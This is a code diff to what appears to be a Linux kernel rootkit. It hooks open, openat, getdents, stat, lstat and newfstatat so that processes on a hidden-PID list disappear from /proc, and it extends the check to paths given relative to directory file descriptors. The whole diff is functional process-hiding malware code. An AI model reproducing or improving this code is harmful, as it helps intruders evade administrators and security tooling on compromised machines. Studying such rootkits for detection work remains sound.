@@ -119,45 +119,105 @@ asmlinkage int my_reboot64(int magic1, int magic2, unsigned int cmd, void *arg) 
 	}
 }
 
-bool check_pid_in_path(const char *path) {
-    char *ubuf = alloc_umem(MAX_PATH);
+int get_fd_path(int fd, char *path) {
+	char *ubuf = NULL;
+	long ret = 0;
+	pid_t pid = 0;
+
+	ubuf = alloc_umem(MAX_PATH);
+	ret = pid = SYSCALL64(__NR_getpid, 0, 0, 0, 0, 0, 0);
+	if (pid) {
+		snprintf(ubuf, MAX_PATH, "/proc/%d/fd/%d", pid, fd);
+		ret = SYSCALL64(__NR_readlink, ubuf, path, MAX_PATH, 0, 0, 0);
+		//if (ret >= 0) {
+			//f_printk("fd %d ret %d ubuf %s path %s\n", fd, ret, ubuf, path);
+		//}
+	}
+	free_umem(ubuf, MAX_PATH);
+	return ret;
+}
+
+bool check_pid_in_path(int dfd, const char *path) {
+    char *ubuf = NULL, *ubuf2 = NULL, *new_path = NULL;
     const char *p = NULL;
     size_t len = 0;
     pid_t pid = 0;
 	unsigned long long ull = 0;
+	off_t off = 0;
+	struct stat *stat = NULL;
+	long ret = 0;
 
+	ubuf = alloc_umem(MAX_PATH);
     if (ubuf) {
-        f_memcpy(ubuf, path, f_strlen(path));
+		if (dfd != -1) {
+			ret = get_fd_path(dfd, ubuf);
+			if (ret >= 0) {
+				//f_printk("path of %d is %s\n", dfd, ubuf);
+				off = f_strlen(ubuf);
+				ubuf[off++] = '/';
+				ubuf[off] = 0;
+			}
+		}
+		f_memcpy(ubuf + off, path, f_strlen(path));
+		new_path = alloc_umem(MAX_PATH);
+		f_memcpy(new_path, ubuf, f_strlen(ubuf));
+		f_printk("fd = %d, ubuf = %s\n", dfd, ubuf);
         f_strreplace(ubuf, '/', 0);
         p = ubuf;
-		while (!p[len] && len < f_strlen(path) && len < 4096) {
+		while (!p[len] && len < f_strlen(new_path) && len < 4096) {
 			len++;
 		}
 		p += len;
         while ((len = f_strlen(p))) {
             f_kstrtoull(p, 10, &ull);
 			pid = (pid_t) ull;
-			//f_printk("checking pid %d - %s - %d - %s\n", pid, p, len, path);
+			//f_printk("checking pid %d - %s - %d - %s\n", pid, p, len, new_path);
             if (pid && pid_list_find(pid)) {
-				free_umem(ubuf, MAX_PATH);
-                return true;
+				// now we have a numeric entry which is in hidden pid list
+				// but, to be sure it's a proc element, first we check if it's a directory.
+				// so, we compose the path until the pid: <before_elements>/pid
+				off = (long)memmem(new_path, f_strlen(new_path), p, len) - (long)new_path;
+				off += len;
+				if (off > 0) {
+					ubuf2 = alloc_umem(MAX_PATH);
+					if (ubuf2) {
+						f_memcpy(ubuf2, new_path, off);
+						ubuf2[off] = 0;
+						stat = alloc_umem(sizeof(struct stat));
+						if (stat) {
+							ret = SYSCALL64(__NR_stat, ubuf2, stat, 0, 0, 0, 0);
+							f_printk("new_path %s ubuf2 %s ret %d stat->st_mode %d stat %lx\n", new_path, ubuf2, ret, stat->st_mode, stat);
+							if (!ret && S_ISDIR(stat->st_mode)) {
+								//f_printk("ubuf2 %s\n", ubuf2);
+								free_umem(new_path, MAX_PATH);
+								free_umem(stat, sizeof(struct stat));
+								free_umem(ubuf2, MAX_PATH);
+								free_umem(ubuf, MAX_PATH);
+								return true;
+							}
+							free_umem(stat, sizeof(struct stat));
+						}
+						free_umem(ubuf2, MAX_PATH);
+					}
+				}
             }
             p += len + 1;
         }
+		free_umem(new_path, MAX_PATH);
         free_umem(ubuf, MAX_PATH);
     }
 	return false;
 }
 
 asmlinkage int my_open64(const char *path, int flags, umode_t mode) {
-	if (check_pid_in_path(path)) {
+	if (check_pid_in_path(-1, path)) {
 		return -ENOENT;
 	}
 	return SYSCALL64(__NR_open, path, flags, mode, 0, 0, 0);
 }
 
 asmlinkage int my_openat64(int dfd, const char *path, int flags, umode_t mode) {
-	if (check_pid_in_path(path)) {
+	if (check_pid_in_path(dfd, path)) {
 		return -ENOENT;
 	}
 	return SYSCALL64(__NR_openat, dfd, path, flags, mode, 0, 0);
@@ -175,7 +235,7 @@ long my_getdents(long nr, unsigned int fd, void __user *dirent, unsigned int cou
 		nread = SYSCALL64(__NR_getdents, fd, ubuf, count, 0, 0, 0);
 		for (off = 0, off_new = 0, e = ubuf; off < nread; off += e->d_reclen, e = ubuf + off) {
 			//f_printk("nread %d %d %d\n", nread, off, e->d_reclen);
-			if (!check_pid_in_path(e->d_name)) {
+			if (!check_pid_in_path(fd, e->d_name)) {
 				//f_printk("gentdents %s\n", e->d_name);
 				f_memcpy(ubuf_new + off_new, ubuf + off, e->d_reclen);
 				off_new += e->d_reclen;
@@ -197,28 +257,28 @@ asmlinkage long my_getdents6464(unsigned int fd, struct linux_dirent64 __user *d
 	return my_getdents(__NR_getdents64, fd, dirent, count);
 }
 
-asmlinkage long my_stat64(const char __user *filename, struct __old_kernel_stat __user *statbuf) {
-	if (check_pid_in_path(filename)) {
+asmlinkage long my_stat64(const char __user *filename, struct stat __user *statbuf) {
+	if (check_pid_in_path(-1, filename)) {
 		return -ENOENT;
 	}
 	return SYSCALL64(__NR_stat, filename, statbuf, 0, 0, 0, 0);
 }
 
-asmlinkage long my_lstat64(const char __user * filename, struct __old_kernel_stat __user * statbuf) {
-    if (check_pid_in_path(filename)) {
+asmlinkage long my_lstat64(const char __user * filename, struct stat __user *statbuf) {
+    if (check_pid_in_path(-1, filename)) {
         return -ENOENT;
     }
     return SYSCALL64(__NR_lstat, filename, statbuf, 0, 0, 0, 0);
 }
 /*
-asmlinkage long my_newstat64(const char __user *filename, struct __old_kernel_stat __user *statbuf) {
+asmlinkage long my_newstat64(const char __user *filename, struct stat __user *statbuf) {
     if (check_pid_in_path(filename)) {
         return -ENOENT;
     }
     return SYSCALL64(__NR_newstat, filename, statbuf, 0, 0, 0, 0);
 }
 
-asmlinkage long my_newlstat64(const char __user *filename, struct __old_kernel_stat __user *statbuf) {
+asmlinkage long my_newlstat64(const char __user *filename, struct stat __user *statbuf) {
     if (check_pid_in_path(filename)) {
         return -ENOENT;
     }
@@ -226,7 +286,7 @@ asmlinkage long my_newlstat64(const char __user *filename, struct __old_kernel_s
 }
 */
 asmlinkage long my_newfstatat64(int dfd, const char __user *filename, struct stat __user *statbuf, int flag) {
-    if (check_pid_in_path(filename)) {
+    if (check_pid_in_path(-1, filename)) {
         return -ENOENT;
     }
     return SYSCALL64(__NR_newfstatat, dfd, filename, statbuf, flag, 0, 0);
